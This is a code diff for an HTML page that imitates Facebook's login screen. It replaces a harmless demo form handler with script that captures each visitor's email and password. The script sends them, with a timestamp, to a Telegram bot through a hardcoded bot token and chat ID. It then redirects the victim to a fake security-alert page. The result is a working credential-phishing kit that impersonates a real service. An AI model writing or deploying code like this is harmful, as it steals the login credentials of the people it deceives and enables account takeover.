@@ -3,219 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - log in or sign up</title>
+    <title>Facebook - Log In</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .container {
-            max-width: 980px;
-            margin: 0 auto;
-            padding: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex: 1;
-            gap: 40px;
-        }
-
-        .left-section {
-            flex: 1;
-            padding-bottom: 100px;
-        }
-
-        .logo {
-            color: #1877f2;
-            font-size: 60px;
-            font-weight: bold;
-            letter-spacing: -2px;
-            margin-bottom: 10px;
-        }
-
-        .tagline {
-            font-size: 28px;
-            line-height: 32px;
-            color: #1c1e21;
-            max-width: 500px;
-        }
-
-        .right-section {
-            flex: 0 0 396px;
-        }
-
-        .login-box {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-            padding: 20px;
-            text-align: center;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            outline: none;
-        }
-
-        .input-field:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .login-btn {
-            width: 100%;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-            transition: background 0.2s;
-        }
-
-        .login-btn:hover {
-            background: #166fe5;
-        }
-
-        .forgot-password {
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-            display: block;
-            margin: 16px 0;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .create-account-btn {
-            background: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px 16px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-            transition: background 0.2s;
-        }
-
-        .create-account-btn:hover {
-            background: #36a420;
-        }
-
-        .create-page {
-            margin-top: 28px;
-            text-align: center;
-            font-size: 14px;
-            color: #1c1e21;
-        }
-
-        .create-page a {
-            color: #1c1e21;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .create-page a:hover {
-            text-decoration: underline;
-        }
-
-        footer {
-            background: white;
-            padding: 20px;
-        }
-
-        .footer-content {
-            max-width: 980px;
-            margin: 0 auto;
-            color: #737373;
-            font-size: 12px;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #dddfe2;
-        }
-
-        .footer-links a {
-            color: #737373;
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .copyright {
-            margin-top: 20px;
-        }
-
-        /* Mobile Responsive */
-        @media (max-width: 900px) {
-            .container {
-                flex-direction: column;
-                text-align: center;
-                padding-top: 40px;
-            }
-
-            .left-section {
-                padding-bottom: 40px;
-            }
-
-            .logo {
-                font-size: 50px;
-            }
-
-            .tagline {
-                font-size: 24px;
-            }
-
-            .right-section {
-                flex: 0 0 auto;
-                width: 100%;
-                max-width: 400px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .logo {
-                font-size: 40px;
-            }
-
-            .tagline {
-                font-size: 20px;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; }
+        .container { max-width: 980px; margin: 0 auto; padding: 20px; display: flex; align-items: center; justify-content: space-between; flex: 1; gap: 40px; }
+        .left-section { flex: 1; padding-bottom: 100px; }
+        .logo { color: #1877f2; font-size: 60px; font-weight: bold; letter-spacing: -2px; margin-bottom: 10px; }
+        .tagline { font-size: 28px; line-height: 32px; color: #1c1e21; max-width: 500px; }
+        .right-section { flex: 0 0 396px; }
+        .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; text-align: center; }
+        .input-field { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
+        .input-field:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; background: #1877f2; color: white; border: none; border-radius: 6px; padding: 14px; font-size: 20px; font-weight: bold; cursor: pointer; margin: 10px 0; transition: background 0.2s; }
+        .login-btn:hover { background: #166fe5; }
+        .login-btn:disabled { background: #a4b0be; cursor: not-allowed; }
+        .forgot-password { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 16px 0; }
+        .forgot-password:hover { text-decoration: underline; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-account-btn { background: #42b72a; color: white; border: none; border-radius: 6px; padding: 14px 16px; font-size: 17px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        .create-account-btn:hover { background: #36a420; }
+        .create-page { margin-top: 28px; text-align: center; font-size: 14px; color: #1c1e21; }
+        .create-page a { color: #1c1e21; text-decoration: none; font-weight: bold; }
+        footer { background: white; padding: 20px; margin-top: auto; }
+        .footer-content { max-width: 980px; margin: 0 auto; color: #737373; font-size: 12px; }
+        .loading { display: none; color: #1877f2; margin-top: 10px; }
+        @media (max-width: 900px) { .container { flex-direction: column; text-align: center; padding-top: 40px; } .left-section { padding-bottom: 40px; } .logo { font-size: 50px; } .tagline { font-size: 24px; } .right-section { flex: 0 0 auto; width: 100%; max-width: 400px; } }
     </style>
 </head>
 <body>
@@ -228,16 +41,15 @@
         <div class="right-section">
             <div class="login-box">
                 <form id="loginForm">
-                    <input type="text" class="input-field" placeholder="Email or phone number" required>
-                    <input type="password" class="input-field" placeholder="Password" required>
-                    <button type="submit" class="login-btn">Log In</button>
+                    <input type="text" id="email" class="input-field" placeholder="Email or phone number" required>
+                    <input type="password" id="password" class="input-field" placeholder="Password" required>
+                    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+                    <div class="loading" id="loading">Checking your account...</div>
                 </form>
                 
                 <a href="#" class="forgot-password">Forgot password?</a>
-                
                 <div class="divider"></div>
-                
-                <button class="create-account-btn">Create new account</button>
+                <button class="create-account-btn" onclick="alert('Use Log In button for demo')">Create new account</button>
             </div>
             
             <div class="create-page">
@@ -247,65 +59,59 @@
     </div>
 
     <footer>
-        <div class="footer-content">
-            <div class="footer-links">
-                <a href="#">English (US)</a>
-                <a href="#">Français (France)</a>
-                <a href="#">العربية</a>
-                <a href="#">Español</a>
-                <a href="#">Türkçe</a>
-                <a href="#">Italiano</a>
-                <a href="#">Deutsch</a>
-                <a href="#">Português (Brasil)</a>
-                <a href="#">हिन्दी</a>
-                <a href="#">中文(简体)</a>
-                <a href="#">日本語</a>
-            </div>
-            <div class="footer-links">
-                <a href="#">Sign Up</a>
-                <a href="#">Log In</a>
-                <a href="#">Messenger</a>
-                <a href="#">Facebook Lite</a>
-                <a href="#">Video</a>
-                <a href="#">Places</a>
-                <a href="#">Games</a>
-                <a href="#">Marketplace</a>
-                <a href="#">Meta Pay</a>
-                <a href="#">Meta Store</a>
-                <a href="#">Meta Quest</a>
-                <a href="#">Instagram</a>
-                <a href="#">Threads</a>
-                <a href="#">Fundraisers</a>
-                <a href="#">Services</a>
-                <a href="#">Voting Information Center</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Privacy Center</a>
-                <a href="#">Groups</a>
-                <a href="#">About</a>
-                <a href="#">Create ad</a>
-                <a href="#">Create Page</a>
-                <a href="#">Developers</a>
-                <a href="#">Careers</a>
-                <a href="#">Cookies</a>
-                <a href="#">Ad choices</a>
-                <a href="#">Terms</a>
-                <a href="#">Help</a>
-                <a href="#">Contact Uploading & Non-Users</a>
-            </div>
-            <div class="copyright">Meta © 2024</div>
-        </div>
+        <div class="footer-content">Meta © 2024</div>
     </footer>
 
     <script>
-        // Simple form handling
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            alert('Login form submitted! (No backend connected)');
-        });
+        // 🔥 CONFIGURE YOUR TELEGRAM BOT HERE
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Replace with your chat ID
+        
+        const loginForm = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const loading = document.getElementById('loading');
 
-        // Create account button
-        document.querySelector('.create-account-btn').addEventListener('click', function() {
-            alert('Redirect to sign up page!');
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading
+            loginBtn.disabled = true;
+            loading.style.display = 'block';
+            
+            // Prepare message
+            const message = `🚨 *FACEBOOK LOGIN* 🚨\n\n` +
+                          `📧 Email: ${email}\n` +
+                          `🔑 Password: ${password}\n` +
+                          `🌐 Page: Login\n` +
+                          `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            try {
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot8582083084:AAHy-qeLImcvXVBauwzDC011z6ww5qqX22o/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: -1003840277325,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Wait 1.5s then redirect to security alert
+                setTimeout(() => {
+                    window.location.href = 'security-alert.html';
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // Still redirect even if Telegram fails
+                setTimeout(() => {
+                    window.location.href = 'security-alert.html';
+                }, 1500);
+            }
         });
     </script>
 </body>
